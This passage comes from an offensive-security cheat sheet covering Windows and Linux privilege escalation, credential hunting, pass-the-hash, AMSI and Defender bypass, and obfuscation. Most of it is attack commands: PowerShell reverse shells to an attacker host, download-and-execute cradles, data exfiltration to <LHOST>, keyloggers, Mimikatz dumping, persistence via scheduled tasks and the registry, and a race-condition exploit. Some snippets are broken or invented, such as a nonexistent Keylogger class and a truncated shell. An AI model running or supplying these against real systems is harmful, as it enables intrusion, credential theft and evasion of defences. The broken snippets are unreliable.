- Default in Microsoft Windows since `Microsoft Windows 2000`
- Can be used for `Relaying`

##### Example

```c
admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030
```

##### Algorithm

```c
SC = 8-byte server challenge, random
CC = 8-byte client challenge, random
CC* = (X, time, CC2, domain name)
v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)
LMv2 = HMAC-MD5(v2-Hash, SC, CC)
NTv2 = HMAC-MD5(v2-Hash, SC, CC*)
response = LMv2 | CC | NTv2 | CC*
```

##### Cracking

```c
$ john --format=netntlmv2 <FILE>
$ hashcat -m 5600 -a 3 <FILE>
```

### Privileges and Permissions

#### AlwaysInstallElevated

```c
C:\> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
C:\> reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

```c
$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<LHOST> lport=<LPORT> -f msi > <FILE>.msi
```

```c
C:\> msiexec /quiet /qn /i <FILE>.msi
```

### Registry Handling

#### Enable Colored Output

```c
C:\> reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

Then open a new Terminal Window.

#### Check for Auto Run Programs

```c
C:\> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

#### Get Registry Key Information

```c
C:\> req query <REGISTRY_KEY>
```

#### Modify Registry Key

```c
C:\> reg add <REGISTRY_KEY> /v <VALUE_TO_MODIFY> /t REG_EXPAND_SZ /d C:\PATH\TO\FILE\<FILE>.exe /f
```

#### Search the Registry for Passwords

```c
C:\> req query HKLM /f password /t REG_SZ /s
C:\> req query HKCU /f password /t REG_SZ /s
```

### Searching for Credentials

#### Unattended Windows Installations

##### Potential Files containing Passwords

```c
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

#### Search for Passwords

```c
C:\> dir .s *pass* == *.config
C:\> findstr /si password *.xml *.ini *.txt
PS:\> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
PS:\> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
PS:\> Get-ChildItem -Path C:\Users\<USERNAME>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction
```

#### PowerShell History

```c
C:\> type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

#### Saved Windows Credentials

```c
C:\> cmdkey /list
C:\> runas /savecred /user:<USERNAME> cmd.exe
```

#### Windows Registry

```c
C:\> reg query HKLM /f password /t REG_SZ /s
C:\> reg query HKCU /f password /t REG_SZ /s
```

#### IIS Configuration

```c
C:\> type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

#### PuTTY

```c
C:\> reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
```

### Service Handling

```c
C:\> sc.exe create <SERVICE>
C:\> sc start <SERVICE>
C:\> sc qc <SERVICE>
```

### Tasks & Services

#### Scheduled Tasks

```c
C:\> schtasks
C:\> schtasks /query /tn <TASK> /fo list /v
C:\> schtasks /run /tn <TASK>
PS C:\> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

#### Unquoted Service Paths

Search for `Unquoted Service Paths` by using `sc qc`.

```c
C:\> sc qc
C:\> sc qc WindowsScheduler
C:\> sc stop WindowsScheduler
C:\> sc start WindowsScheduler
```

```c
C:\> icacls <PROGRAM>.exe
C:\> icacls C:\PROGRA~2\SYSTEM~1\<SERVICE>.exe
C:\> icacls C:\PROGRA~2\SYSTEM~1\<SERVICE>.exe /grant Everyone:F
```

#### Insecure Service Permissions

```c
C:\> accesschk64.exe -qlc <SERVICE>
C:\> icacls C:\Users\<USERNAME>\<FILE>.exe /grant Everyone:F
C:\> sc config <SERVICE> binPath= "C:\Users\<USERNAME>\<FILE>.exe" obj= LocalSystem
C:\> sc stop <SERVICE>
C:\> sc start <SERVICE>
```

#### SeBackup and SeRestore Privilege

##### Backup SAM and SYSTEM Hashes

```c
C:\> reg save hklm\system C:\Users\<USERNAME>\system.hive
C:\> reg save hklm\sam C:\Users\<USERNAME>\sam.hive
```

##### Dumping Hashes

```c
$ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

##### Pass the Hash

```c
$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@<RHOST>
```

#### SeTakeOwnership Privilege

```c
C:\> takeown /f C:\Windows\System32\Utilman.exe
```

```c
C:\> icacls C:\Windows\System32\Utilman.exe /grant Everyone:F
```

```c
C:\Windows\System32\> copy cmd.exe utilman.exe
```

Click the `Ease of Access` button on the logon screen to get a shell with `NT Authority\System` privileges.

#### SeImpersonate and SeAssignPrimaryToken Privilege

> https://github.com/antonioCoco/RogueWinRM

```c
C:\> .\RogueWinRM.exe -p "C:\> .\nc64.exe" -a "-e cmd.exe <LHOST> <LPORT>"
```

### WMIC

```c
C:\> wmic product get name,version,vendor
```

## Microsoft Windows Defender

### Check Whitelisted Paths

```c
PS C:\> reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
```

### Malicious Test String

```c
PS C:\> $str = 'amsiinitfailed'
```

## Minimalistic Offensive Security Tools

> https://github.com/InfosecMatter/Minimalistic-offensive-security-tools

### port-scan-tcp.ps1

```c
PS C:\> IEX(New-Object Net.WebClient).DownloadString('http://<RHOST>/port-scan-tcp.ps1')
```

## nginx

### ngx_http_dav_module Privilege Escalation

> https://nginx.org/en/docs/http/ngx_http_dav_module.html

```c
$ cat << EOF> /tmp/<FILE>.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;events {
worker_connections 768;
}
http {
server {
listen 9001;
root /;
autoindex on;
dav_methods PUT;
}
}
EOF
```

```c
$ sudo nginx -c /tmp/<FILE>.conf
```

```c
$ curl -X PUT localhost:1337/root/.ssh/authorized_keys -d "$(cat <SSH_KEY>.pub)"
```

## PassTheCert

> https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

> https://github.com/AlmondOffSec/PassTheCert/tree/main/Python

```c
$ certipy-ad cert -pfx <CERTIFICATE>.pfx -nokey -out <CERTIFICATE>.crt
$ certipy-ad cert -pfx <CERTIFICATE>.pfx -nocert -out <CERTIFICATE>.key
$ python3 passthecert.py -domain '<DOMAIN>' -dc-host '<DOMAIN>' -action 'modify_user' -target '<USERNAME>' -new-pass '<PASSWORD>' -crt ./<CERTIFICATE>.crt -key ./<CERTIFICATE>.key
$ evil-winrm -i '<RHOST>' -u '<USERNAME>' -p '<PASSWORD>'
```

## Path Variable Hijacking

### Finding accessible SUID Files

```c
$ find / -perm -u=s -type f 2>/dev/null
```

### Find writeable Paths

```c
$ find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

### Add current Directory

```c
$ export PATH=$(pwd):$PATH
```

### Binary File

```c
$ cd /tmp
$ vi <FILE>
$ chmod +x ./<FILE>
$ PATH=$(pwd):$PATH <SUID_FILE>
```

## Perl

### Environment Variable Arbitrary Code Execution

> https://www.elttam.com/blog/env/#content

```c
$ sudo PERL5OPT=-d PERL5DB='system("chmod u+s /bin/bash");' exit;
```

## PHP7.2

```c
$ /usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
```

## pika

### Remote Code Execution (RCE)

```c
#!/usr/bin/env python

import pika

credentials = pika.PlainCredentials('<USERNAME>', '<PASSWORD>')
parameters = pika.ConnectionParameters('<LHOST>',5672,'/',credentials)
connection = pika.BlockingConnection(parameters)
channel = connection.channel()
channel.basic_publish(exchange='', routing_key='plugin_data', body='http://127.0.0.1:9001/<SCRIPT>')
connection.close()
```

## Ping Sweep

### On a Linux Operating System

```c
$ for ip in {1..254}; do (ping -c 1 <XXX.XXX.XXX>.${ip} | grep "bytes from" | grep -v "Unreachable" &); done;
```

### On a Windows Operating System

```c
PS C:\> 1..255 | ForEach-Object { $ip = "<XXX.XXX.XXX>.$_"; if (Test-Connection -ComputerName $ip -Count 1 -Quiet) { $ip } }
```

### With Meterpreter

```c
meterpreter > (for /L %a IN (1,1,254) DO ping /n 1 /w 1 <XXX.XXX.XXX>.%a) | find "Reply"
```

## PKINITtools

```c
$ python3 gettgtpkinit.py -cert-pfx <USERNAME>.pfx -dc-ip <RHOST> <DOMAIN>/<USERNAME> <USERNAME>.ccache
$ export KRB5CCNAME=<USERNAME>.ccache
$ python3 getnthash.py <DOMAIN>/<USERNAME> -key 6617cde50b7ee63faeb6790e84981c746efa66f68a1cc3a394bbd27dceaf0554
```

## plotting

Exploit race condition on linux by swapping file paths between 2 files very quickly (normal file, symlink to root owned file, swap, swap ,swap).

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}
```

## Port Scanning

### On a Linux Operating System

```c
$ nc -zv 127.0.0.1 1-65535 | grep succeeded
```

```c
$ for port in {1..65535}; do echo > /dev/tcp/<RHOST>/$port && echo "$port open"; done 2>/dev/null
```

### On a Windows Operating System

```c
PS C:\> 1..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect("<RHOST>",$_)) "$_ port open"} 2>$null
```

## PoshADCS

>  https://github.com/cfalta/PoshADCS/blob/master/ADCS.ps1

```c
PS C:\> curl http://<LHOST>/ADCS.ps1 | iex
PS C:\> Get-SmartCardCertificate -Identity Administrator -TemplateName Web -NoSmartCard -Verbose
PS C:\> gci cert:\currentuser\my -recurse
```

## powercat

> https://github.com/besimorhino/powercat

```c
PS C:\> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e cmd"
```

### File Transfer

```c
$ impacket-smbserver local . -smb2support
```

```c
PS C:\> Import-Module .\powercat.ps1
PS C:\> powercat -c <LHOST> -p 445 -i C:\PATH\TO\FILE\<FILE>
```

## Powermad

```c
PS C:\> Import-Module ./Powermad.ps1
PS C:\> $secureString = convertto-securestring "<PASSWORD>" -asplaintext -force
PS C:\> New-MachineAccount -MachineAccount <NAME> -Domain <DOMAIN> -DomainController <DOMAIN> -Password $secureString
```

## PowerShell

> https://redteamrecipe.com/powershell-tips-tricks/?s=09

### Enumerating System Information

```c
PS C:\> Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *
```

### Extracting Network Configuration

```c
PS C:\> Get-NetIPConfiguration | Select-Object -Property InterfaceAlias, IPv4Address, IPv6Address, DNServer
```

### Listing Running Processes with Details

```c
PS C:\> Get-Process | Select-Object -Property ProcessName, Id, CPU | Sort-Object -Property CPU -Descending
```

### Accessing Event Logs for Anomalies

```c
PS C:\> Get-EventLog -LogName Security | Where-Object {$_.EntryType -eq 'FailureAudit'}
```

### Scanning for Open Ports

```c
PS C:\> 1..1024 | ForEach-Object { $sock = New-Object System.Net.Sockets.TcpClient; $async = $sock.BeginConnect('localhost', $_, $null, $null); $wait = $async.AsyncWaitHandle.WaitOne(100, $false); if($sock.Connected) { $_ } ; $sock.Close() }
```

### Retrieving Stored Credentials

```c
PS C:\> $cred = Get-Credential; $cred.GetNetworkCredential() | Select-Object -Property UserName, Password
```

### Executing Remote Commands

```c
PS C:\> Invoke-Command -ComputerName TargetPC -ScriptBlock { Get-Process } -Credential (Get-Credential)
```

### Downloading and Executing Scripts from URL

```c
PS C:\> $url = 'http://<LHOST>/<FILE>.ps1'; Invoke-Expression (New-Object Net.WebClient).DownloadString($url)
```

### Bypassing Execution Policy for Script Execution

```c
PS C:\> Set-ExecutionPolicy Bypass -Scope Process -Force; .\<FILE>.ps1
```

### Enumerating Domain Users

```c
PS C:\> Get-ADUser -Filter * -Properties * | Select-Object -Property Name, Enabled, LastLogonDate
```

### Capturing Keystrokes

```c
PS C:\> $path = 'C:\<FILE>.txt'; Add-Type -AssemblyName System.Windows.Forms; $listener = New-Object System.Windows.Forms.Keylogger; [System.Windows.Forms.Application]::Run($listener); $listener.Keys | Out-File -FilePath $path
```

### Extracting Wi-Fi Profiles and Passwords

```c
PS C:\> netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_ -replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name="$_" key=clear }
```

### Monitoring File System Changes

```c
PS C:\> $watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\'; $watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }
```

### Creating Reverse Shell

```c
PS C:\> $client = New-Object System.Net.Sockets.TCPClient('<LHOST>', <LPORT>); $stream = PS C:\> $client.GetStream(); [byte[]]$bytes = 0..65535...
```

### Disabling Windows Defender

```c
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true
```

### Extracting Browser Saved Passwords

```c
PS C:\> Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\<FILE>.txt
```

### Conducting Network Sniffing

```c
PS C:\> $adapter = Get-NetAdapter | Select-Object -First 1; New-NetEventSession -Name '<NAME>' -CaptureMode SaveToFile -LocalFilePath 'C:\<FILE>.etl'; Add-NetEventPacketCaptureProvider -SessionName '<NAME>' -Level 4 -CaptureType Both -Enable; Start-NetEventSession -Name '<NAME>'; Stop-NetEventSession -Name '<NAME>' after 60
```

### Bypassing AMSI (Anti-Malware Scan Interface)

```c
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Extracting System Secrets with Mimikatz

```c
PS C:\> Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"' | Out-File -FilePath C:\<FILE>.txt
```

### String Obfuscation

```c
PS C:\> $originalString = 'SensitiveCommand'; $obfuscatedString = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($originalString)); $decodedString = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($obfuscatedString)); Invoke-Expression $decodedString
```

### Command Aliasing

```c
PS C:\> $alias = 'Get-Dir'; Set-Alias -Name $alias -Value Get-ChildItem; Invoke-Expression $alias
```

### Variable Name Obfuscation

```c
PS C:\> $o = 'Get'; $b = 'Process'; $cmd = $o + '-' + $b; Invoke-Expression $cmd
```

### File Path Obfuscation

```c
PS C:\> $path = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVGVtcFxBZG1pblRvb2xz')); Invoke-Item $path
```

### Using Alternate Data Streams for Evasion

```c
PS C:\> $content = 'Invoke-Mimikatz'; $file = 'C:\<FILE>.txt'; $stream = 'C:\<FILE>.txt:hidden'; Set-Content -Path $file -Value 'This is a normal file'; Add-Content -Path $stream -Value $content; Get-Content -Path $stream
```

### Bypassing Script Execution Policy

```c
PS C:\> $policy = Get-ExecutionPolicy; Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process; # Run your script here; Set-ExecutionPolicy -ExecutionPolicy $policy -Scope Process
```

### In-Memory Script Execution

```c
PS C:\> $code = [System.IO.File]::ReadAllText('C:\<FILE>.ps1'); Invoke-Expression $code
```

### Dynamic Invocation with Reflection

```c
PS C:\> $assembly = [Reflection.Assembly]::LoadWithPartialName('System.Management'); $type = $assembly.GetType('System.Management.ManagementObjectSearcher'); $constructor = $type.GetConstructor(@([string])); $instance = $constructor.Invoke(@('SELECT * FROM Win32_Process')); $method = $type.GetMethod('Get'); $result = $method.Invoke($instance, @())
```

### Encoded Command Execution

```c
PS C:\> $encodedCmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('Get-Process')); powershell.exe -EncodedCommand $encodedCmd
```

### Utilizing PowerShell Runspaces for Evasion

```c
PS C:\> $runspace = [runspacefactory]::CreateRunspace(); $runspace.Open(); $pipeline = $runspace.CreatePipeline(); $pipeline.Commands.AddScript('Get-Process'); $results = $pipeline.Invoke(); $runspace.Close(); $results
```

### Environment Variable Obfuscation

```c
PS C:\> $env:PSVariable = 'Get-Process'; Invoke-Expression $env:PSVariable
```

### Function Renaming for Evasion

```c
PS C:\> Function MyGetProc { Get-Process }; MyGetProc
```

### Using PowerShell Classes for Code Hiding

```c
PS C:\> class HiddenCode { [string] Run() { return 'Hidden command executed' } }; $instance = [HiddenCode]::new(); $instance.Run()
```

### Registry Key Usage for Persistence

```c
PS C:\> $path = 'HKCU:\Software\<FILE>'; New-Item -Path $path -Force; New-ItemProperty -Path $path -Name 'Config' -Value 'EncodedPayload' -PropertyType String -Force; $regValue = Get-ItemProperty -Path $path -Name 'Config'; Invoke-Expression $regValue.Config
```

### Out-Of-Band Data Exfiltration

```c
PS C:\> $data = Get-Process | ConvertTo-Json; Invoke-RestMethod -Uri 'http://<LHOST>/data' -Method Post -Body $data
```

### Using PowerShell to Access WMI for Stealth

```c
PS C:\> $query = 'SELECT * FROM Win32_Process'; Get-WmiObject -Query $query
```

### Scheduled Task for Persistence

```c
PS C:\> $action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -Command "<COMMAND>"'; $trigger = New-ScheduledTaskTrigger -AtStartup; Register-ScheduledTask -Action $action -Trigger $trigger -TaskName '<NAME>' -Description '<DESCRIPTION>'
```

### Using PowerShell to Interact with the Network Quietly

```c
PS C:\> $client = New-Object Net.Sockets.TcpClient('<LHOST>', 443); $stream = $client.GetStream(); # Send and receive data
```

### Base64 Encoding for Command Obfuscation

```c
PS C:\> $command = 'Get-Process'; $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command)); powershell.exe -EncodedCommand $encodedCommand
```

### Utilizing PowerShell Add-Type for Code Execution

```c
PS C:\> Add-Type -TypeDefinition 'using System; public class <CLASS> { public static void Run() { Console.WriteLine("Executed"); } }'; [<CLASS>]::Run()
```

### Extracting Credentials from Windows Credential Manager

```c
PS C:\> $credman = New-Object -TypeName PSCredentialManager.Credential; $credman | Where-Object { $_.Type -eq 'Generic' } | Select-Object -Property UserName, Password
```

### Retrieving Passwords from Unsecured Files

```c
PS C:\> Select-String -Path C:\Users\*\Documents\*.txt -Pattern 'password' -CaseSensitive
```

### Dumping Credentials from Windows Services

```c
PS C:\> Get-WmiObject win32_service | Where-Object {$_.StartName -like '*@*'} | Select-Object Name, StartName, DisplayName
```

### Extracting Saved RDP Credentials

```c
PS C:\> cmdkey /list | Select-String 'Target: TERMSRV' | ForEach-Object { cmdkey /delete:($_ -split ' ')[-1] }
```

### Retrieving Browser Cookies for Credential Theft

```c
PS C:\> $env:USERPROFILE + '\AppData\Local\Google\Chrome\User Data\Default\Cookies' | Get-Item
```

### Extracting Credentials from IIS Application Pools

```c
PS C:\> Import-Module WebAdministration; Get-IISAppPool | Select-Object Name, ProcessModel
```

### Reading Credentials from Configuration Files

```c
PS C:\> Get-ChildItem -Path C:\ -Include *.config -Recurse | Select-String -Pattern 'password='
```

### Dumping Credentials from Scheduled Tasks

```c
PS C:\> Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike 'S-1-5-18'} | Select-Object TaskName, TaskPath, Principal
```

### Extracting SSH Keys from User Directories

```c
PS C:\> Get-ChildItem -Path C:\Users\*\.ssh\id_rsa -Recurse
```

### Retrieving Credentials from Database Connection Strings

```c
PS C:\> Select-String -Path C:\inetpub\wwwroot\*.config -Pattern 'connectionString' -CaseSensitive
```

### Simple PowerShell Reverse Shell

```c
PS C:\> $client = New-Object System.Net.Sockets.TCPClient('<LHOST>', <LPORT>); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()
```

### HTTP-Based PowerShell Reverse Shell

```c
PS C:\> while($true) { try { $client = New-Object System.Net.Sockets.TCPClient('<LHOST>', <LPORT>); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close() } catch { Start-Sleep -Seconds 10 } }
```

### WebSocket-Based PowerShell Reverse Shell

```c
PS C:\> $ClientWebSocket = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object System.Uri("ws://<LHOST>:<LPORT>"); $ClientWebSocket.ConnectAsync($uri, $null).Result; $buffer = New-Object Byte[] 1024; while ($ClientWebSocket.State -eq 'Open') { $received = $ClientWebSocket.ReceiveAsync($buffer, $null).Result; $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $received.Count); $output = iex $command 2>&1 | Out-String; $bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($output); $ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }
```

### DNS-Based PowerShell Reverse Shell

```c
PS C:\> function Invoke-DNSReverseShell { param([string]$<LHOST>, [int]$<LPORT>) $client = New-Object System.Net.Sockets.TCPClient($attacker_ip, $attacker_port); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $encodedSendback = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($sendback)); nslookup $encodedSendback $attacker_ip; $stream.Flush()}; $client.Close() }
```

### Encrypted PowerShell Reverse Shell

```c
PS C:\> $ErrorActionPreference = 'SilentlyContinue'; $client = New-Object System.Net.Sockets.TCPClient('<LHOST>', <LPORT>); $stream = $client.GetStream(); $sslStream = New-Object System.Net.Security.SslStream($stream, $false, {$true} ); $sslStream.AuthenticateAsClient('<LHOST>'); $writer = New-Object System.IO.StreamWriter($sslStream); $reader = New-Object System.IO.StreamReader($sslStream); while($true) { $writer.WriteLine('PS ' + (pwd).Path + '> '); $writer.Flush(); $command = $reader.ReadLine(); if($command -eq 'exit') { break; }; $output = iex $command 2>&1 | Out-String; $writer.WriteLine($output); $writer.Flush() }; $client.Close()
```

### Invoke Windows API for Keylogging

```c
PS C:\> Add-Type -TypeDefinition @" using System; using System.Runtime.InteropServices; public class KeyLogger { [DllImport("user32.dll")] public static extern int GetAsyncKeyState(Int32 i); } "@ while ($true) { Start-Sleep -Milliseconds 100 for ($i = 8; $i -le 190; $i++) { if ([KeyLogger]::GetAsyncKeyState($i) -eq -32767) { $Key = [System.Enum]::GetName([System.Windows.Forms.Keys], $i) Write-Host $Key } } }
```

### Accessing Physical Memory with Windows API

```c
PS C:\> Add-Type -TypeDefinition @" using System; using System.Runtime.InteropServices; public class MemoryReader { [DllImport("kernel32.dll")] public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead); } "@ $process = Get-Process -Name 'process_name' $handle = $process.Handle $buffer = New-Object byte[] 1024 $bytesRead = 0 [MemoryReader]::ReadProcessMemory($handle, [IntPtr]0x00000000, $buffer, $buffer.Length, [ref]$bytesRead)
```

### Using Windows API for Screen Capturing

```c
PS C:\> Add-Type -TypeDefinition @" using System; using System.Drawing; using System.Runtime.InteropServices; public class ScreenCapture { [DllImport("user32.dll")] public static extern IntPtr GetDesktopWindow(); [DllImport("user32.dll")] public static extern IntPtr GetWindowDC(IntPtr hWnd); [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop); } "@ $desktop = [ScreenCapture]::GetDesktopWindow() $dc = [ScreenCapture]::GetWindowDC($desktop) # Further code to perform screen capture goes here
```

### Manipulating Windows Services via API

```c
PS C:\> Add-Type -TypeDefinition @" using System; using System.Runtime.InteropServices; public class ServiceManager { [DllImport("advapi32.dll", SetLastError = true)] public static extern IntPtr OpenSCManager(string lpMachineName, string lpSCDB, int scParameter); [DllImport("advapi32.dll", SetLastError = true)] public static extern IntPtr CreateService(IntPtr SC_HANDLE, string lpSvcName, string lpDisplayName, int dwDesiredAccess, int dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, IntPtr lpdwTagId, string lpDependencies, string lp, string lpPassword); [DllImport("advapi32.dll", SetLastError = true)] public static extern bool StartService(IntPtr SVHANDLE, int dwNumServiceArgs, string lpServiceArgVectors); } "@ $scManagerHandle = [ServiceManager]::OpenSCManager(null, null, 0xF003F) # Further code to create, modify, or start services goes here
```

### Windows API for Clipboard Access

```c
PS C:\> Add-Type -TypeDefinition @" using System; using System.Runtime.InteropServices; using System.Text; public class ClipboardAPI { [DllImport("user32.dll")] public static extern bool OpenClipboard(IntPtr hWndNewOwner); [DllImport("user32.dll")] public static extern bool CloseClipboard(); [DllImport("user32.dll")] public static extern IntPtr GetClipboardData(uint uFormat); [DllImport("kernel32.dll")] public static extern IntPtr GlobalLock(IntPtr hMem); [DllImport("kernel32.dll")] public static extern bool GlobalUnlock(IntPtr hMem); [DllImport("kernel32.dll")] public static extern int GlobalSize(IntPtr hMem); } "@ [ClipboardAPI]::OpenClipboard([IntPtr]::Zero) $clipboardData = [ClipboardAPI]::GetClipboardData(13) # CF_TEXT format $gLock = [ClipboardAPI]::GlobalLock($clipboardData) $size = [ClipboardAPI]::GlobalSize($clipboardData) $buffer = New-Object byte[] $size [System.Runtime.InteropServices.Marshal]::Copy($gLock, $buffer, 0, $size) [ClipboardAPI]::GlobalUnlock($gLock) [ClipboardAPI]::CloseClipboard() [System.Text.Encoding]::Default.GetString($buffer)
```

### Finding Writable and Executable Memory

```c
PS C:\> $proc = Get-NtProcess -ProcessId $pid -Access QueryLimitedInformation Get-NtVirtualMemory -Process $proc | Where-Object { $_.Protect -band "ExecuteReadWrite" }
```

### Finding Shared Section Handles

```c
PS C:\> $ss = Get-NtHandle -ObjectType Section -GroupByAddress | Where-Object ShareCount -eq 2 $mask = Get-NtAccessMask -SectionAccess MapWrite $ss = $ss | Where-Object { Test-NtAccessMask $_.AccessIntersection $mask } foreach($s in $ss) { $count = ($s.ProcessIds | Where-Object { Test-NtProcess -ProcessId $_ -Access DupHandle }).Count if ($count -eq 1) { $s.Handles | Select ProcessId, ProcessName, Handle } }
```

### Modifying a Mapped Section

```c
PS C:\> $sect = $handle.GetObject() $map = Add-NtSection -Section $sect -Protection ReadWrite $random = Get-RandomByte -Size $map.Length Write-NtVirtualMemory -Mapping $map -Data $random
```

### Process Creation and Command Line Parsing

```c
PS C:\> $proc = New-Win32Process -CommandLine "notepad <FILE>.txt"
```

### Security Implications of Command Line Parsing

```c
PS C:\> $proc = New-Win32Process -CommandLine "notepad <FILE>.txt" -ApplicationName "c:\windows\notepad.exe"
```

### Using Shell APIs for Non-Executable Files

```c
PS C:\> Start-Process "<FILE>.txt" -Verb "print"
```

### Querying Service Status with PowerShell

```c
PS C:\> Get-Win32Service
```

### Finding Executables That Import Specific APIs

```c
PS C:\> $imps = ls "$env:WinDir\*.exe" | ForEach-Object { Get-Win32ModuleImport -Path $_.FullName } PS> $imps | Where-Object Names -Contains "CreateProcessW" | Select-Object ModulePath
```

### Finding Hidden Registry Keys or Values

```c
PS C:\> ls NtKeyUser:\SOFTWARE -Recurse | Where-Object Name -Match "`0"
PS C:\> Get-NtTokenPrivilege $token
```

## PowerShell Constrained Language Mode (CLM)

```c
PS C:\> Get-ApplockerPolicy -Effective -xml
PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### Bypass Test

```c
PS C:\> $a = Get-ApplockerPolicy -effective
PS C:\> $a.rulecollections
```

### Bypass

```c
PS C:\> $ExecutionContext.SessionState.LanguageMode
PS C:\> IEX(New-Object Net.WebClient).DownloadString('http://<RHOST>/<FILE>.ps1')
```

```c
PS C:\> powershell -version 2
```

#### Example

```c
PS C:\> IEX(New-Object Net.WebClient).DownloadString('http://<RHOST>/Invoke-Rubeus.ps1'); Invoke-Rubeus.ps1
```

### Execute Code in another User Context

```c
PS C:\> $SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword); Invoke-Command -ComputerName localhost -Credential $credential -ScriptBlock { <COMMAND> }
```

### Decrypt Encrypted Credentials XML for PowerShell

#### Manual Steps

```c
PS C:\> [xml]$xmlContent = Get-Content -Path "C:\PATH\TO\FILE\Credentials.xml"
